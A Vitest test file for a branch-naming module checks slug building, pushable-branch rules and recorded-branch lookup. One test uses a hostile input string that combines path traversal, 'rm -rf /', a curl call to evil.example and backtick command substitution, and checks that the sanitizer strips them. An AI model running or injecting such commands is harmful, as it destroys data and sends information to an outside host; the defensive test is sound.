import { describe, expect, it } from "vitest";
import {
  branchName,
  isAttemptBranch,
  recordedBranch,
  shortSlug,
  ticketKey,
} from "./naming.js";

describe("branch naming", () => {
  it("follows prb/<ticket id>/<short-slug> for a new ticket", () => {
    expect(
      branchName({
        ticket_key: "PRB-16",
        ticket_id: "ticket_SCP016",
        outcome: "Provision one isolated worktree",
      }),
    ).toBe("prb/scp016/provision-one-isolated-worktree");
  });

  it("derives prb/ for a ticket's key and for a run with no ticket", () => {
    const outcome = "Search results are paginated.";
    expect(branchName({ ticket_key: "PRB-1", ticket_id: "ticket_52c9d73aa61c2e2b", outcome })).toBe(
      "prb/52c9d73aa61c2e2b/search-results-are-paginated",
    );
    // A run with no ticket is keyed by its label, and its id is the plan's.
    expect(
      branchName({ ticket_key: "local_0123456789ab", ticket_id: "ticket_local_0123456789ab", outcome }),
    ).toBe("prb/local-0123456789ab/search-results-are-paginated");
    expect(branchName({ ticket_key: "gh_o_r_7", ticket_id: "ticket_gh_o_r_7", outcome })).toBe(
      "prb/gh-o-r-7/search-results-are-paginated",
    );
    // A key recorded before `PRB` derives `prb/` like any other.
    expect(branchName({ ticket_key: "AYO-99", ticket_id: "ticket_1", outcome })).toMatch(/^prb\//);
  });

  it("is deterministic, so a retry lands on the branch its predecessor used", () => {
    const args = { ticket_key: "PRB-2", ticket_id: "ticket_01H", outcome: "Send activation email" };
    expect(branchName(args)).toBe(branchName(args));
  });

  it("cannot produce anything but a branch name from a hostile outcome", () => {
    const hostile = "../../.git/config; rm -rf / && curl evil.example`whoami`";
    const branch = branchName({ ticket_key: "PRB-1", ticket_id: "ticket_1", outcome: hostile });
    expect(branch).toMatch(/^prb\/[a-z0-9-]+\/[a-z0-9-]+$/);
    expect(branch).not.toContain("..");
    expect(branch).not.toContain(";");
    expect(branch).not.toContain("`");
    expect(isAttemptBranch(branch)).toBe(true);
  });

  it("bounds the slug so a paragraph does not become a ref name", () => {
    const slug = shortSlug("a".repeat(500));
    expect(slug.length).toBeLessThanOrEqual(32);
  });

  it("falls back rather than producing an empty segment", () => {
    expect(shortSlug("!!!!")).toBe("change");
    expect(() => ticketKey("ticket_")).toThrow(/no usable branch key/);
  });

  it("recognises only its own branches as pushable, under either prefix", () => {
    expect(isAttemptBranch("prb/scp016/slug")).toBe(true);
    expect(isAttemptBranch("ayo/scp016/slug")).toBe(true);
    expect(isAttemptBranch("main")).toBe(false);
    expect(isAttemptBranch("prb/scp016")).toBe(false);
    expect(isAttemptBranch("ayo/scp016")).toBe(false);
    expect(isAttemptBranch("prb/scp016/slug/more")).toBe(false);
    expect(isAttemptBranch("release/prb/x/y")).toBe(false);
    expect(isAttemptBranch("release/ayo/x/y")).toBe(false);
    expect(isAttemptBranch("fcxx/x/y")).toBe(false);
    expect(isAttemptBranch("PRB/x/y")).toBe(false);
    expect(isAttemptBranch("direct/prb-1/slug")).toBe(false);
  });
});

describe("the branch a ticket already has", () => {
  /** The ticket the branches below are recorded for. Its id's segment is `scp016`. */
  const TICKET = "ticket_SCP016";

  it("is the delivery record's, then the latest attempt's, then a live lease's", () => {
    expect(
      recordedBranch({ delivery: "ayo/scp016/one", attempt: "ayo/scp016/two", lease: "ayo/scp016/three" }, TICKET),
    ).toBe("ayo/scp016/one");
    expect(
      recordedBranch({ delivery: null, attempt: "ayo/scp016/two", lease: "ayo/scp016/three" }, TICKET),
    ).toBe("ayo/scp016/two");
    expect(recordedBranch({ lease: "prb/scp016/three" }, TICKET)).toBe("prb/scp016/three");
  });

  it("is null where nothing records one, which is where a new name is derived", () => {
    expect(recordedBranch({}, TICKET)).toBeNull();
    expect(recordedBranch({ delivery: null, attempt: undefined, lease: null }, TICKET)).toBeNull();
  });

  it("is never a branch the loop did not mint", () => {
    // A direct arm's delivery is on a branch the loop may not push to.
    expect(recordedBranch({ delivery: "direct/ayo-36/paging", attempt: "ayo/scp016/two" }, TICKET)).toBe(
      "ayo/scp016/two",
    );
    expect(recordedBranch({ delivery: "direct/ayo-36/paging" }, TICKET)).toBeNull();
  });

  it("is never another ticket's, whichever record names it", () => {
    // Under another ticket's id, or under an id that only begins with this one's.
    expect(recordedBranch({ delivery: "prb/scp017/one", attempt: "ayo/scp016/two" }, TICKET)).toBe(
      "ayo/scp016/two",
    );
    expect(
      recordedBranch({ delivery: "prb/scp017/one", attempt: "ayo/scp017/two", lease: "prb/scp0160/three" }, TICKET),
    ).toBeNull();
  });
});
